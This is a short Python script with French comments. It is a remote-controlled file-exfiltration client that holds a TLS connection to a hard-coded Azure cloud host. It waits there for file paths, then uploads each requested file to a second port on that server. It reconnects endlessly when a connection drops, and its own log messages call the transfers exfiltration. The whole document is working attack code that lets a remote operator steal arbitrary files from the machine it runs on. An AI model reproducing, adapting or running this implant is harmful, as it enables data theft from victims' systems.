#!/usr/bin/python3
import socket
import ssl
import os
import time

SERVER_IP = "server803632.westeurope.cloudapp.azure.com"  # Remplacez par le domaine ou IP du serveur
COMMAND_PORT = 5570               # Port pour recevoir la commande d'exfiltration
FILE_PORT = 5562                  # Port pour envoyer le fichier

def send_file(file_path):
    if not os.path.exists(file_path):
        print(f"[!] Erreur: Le fichier {file_path} n'existe pas.")
        return
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        context = ssl.create_default_context(ssl.Purpose.SERVER_AUTH)
        # Pour tests avec certificat auto-signé:
        # context.check_hostname = False
        # context.verify_mode = ssl.CERT_NONE
        ssl_sock = context.wrap_socket(sock, server_hostname=SERVER_IP)
        ssl_sock.connect((SERVER_IP, FILE_PORT))
        ssl_sock.sendall(os.path.basename(file_path).encode() + b"\n")
        with open(file_path, "rb") as f:
            while chunk := f.read(4096):
                ssl_sock.sendall(chunk)
        print(f"[✔] Fichier {file_path} envoyé avec succès.")
    except Exception as e:
        print(f"[!] Erreur lors de l'envoi : {e}")
    finally:
        ssl_sock.close()

def listen_for_exfil():
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            context = ssl.create_default_context(ssl.Purpose.SERVER_AUTH)
            # Pour tests avec certificat auto-signé:
            # context.check_hostname = False
            # context.verify_mode = ssl.CERT_NONE
            ssl_sock = context.wrap_socket(sock, server_hostname=SERVER_IP)
            ssl_sock.connect((SERVER_IP, COMMAND_PORT))
            print("[+] Connecté au serveur pour exfiltration via SSL.")
            while True:
                file_path = ssl_sock.recv(1024).decode().strip()
                if file_path:
                    print(f"[+] Demande d'exfiltration reçue : {file_path}")
                    send_file(file_path)
        except Exception as e:
            print(f"[!] Erreur de connexion au serveur : {e}, reconnexion en cours...")
            ssl_sock.close()
            time.sleep(5)

if __name__ == "__main__":
    listen_for_exfil()
